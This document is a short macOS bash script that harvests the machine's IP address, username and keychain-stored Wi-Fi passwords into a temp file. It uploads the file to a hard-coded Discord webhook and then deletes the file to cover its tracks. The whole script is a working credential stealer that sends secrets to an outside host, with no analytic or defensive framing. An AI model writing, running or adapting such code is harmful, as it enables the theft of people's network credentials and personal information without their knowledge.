#!/bin/bash

# Variables
dc="https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
temp_file="/tmp/user_info.txt"

# Function to upload files to Discord
function discord_upload() {
  local file_path=$1

  curl -s -X POST "$dc" \
    -F "username=$(whoami)" \
    -F "file1=@$file_path"
}

# Retrieve IP address, username, and password
echo "Collecting user information..." > "$temp_file"
ip_address=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}')
echo "IP address: $ip_address" >> "$temp_file"
echo "Username: $(whoami)" >> "$temp_file"
echo "Password: $(security find-generic-password -ws "AirPort" 2>/dev/null)" >> "$temp_file"

# Retrieve Wi-Fi network names and passwords
echo "Gathering Wi-Fi profiles..." >> "$temp_file"

networks=$(networksetup -listpreferredwirelessnetworks en0 | sed '1d')

for network in $networks; do
  password=$(security find-generic-password -D "AirPort network password" -wa "$network" 2>/dev/null)
  if [[ -n "$password" ]]; then
    echo "Network: $network | Password: $password" >> "$temp_file"
  else
    echo "Network: $network | Password: Not found" >> "$temp_file"
  fi
done

# Upload to Discord
echo "Uploading to Discord..."
discord_upload "$temp_file"
echo "Upload to Discord completed"

# Cleanup
echo "Cleaning up..."
rm "$temp_file"
echo "Cleanup completed"
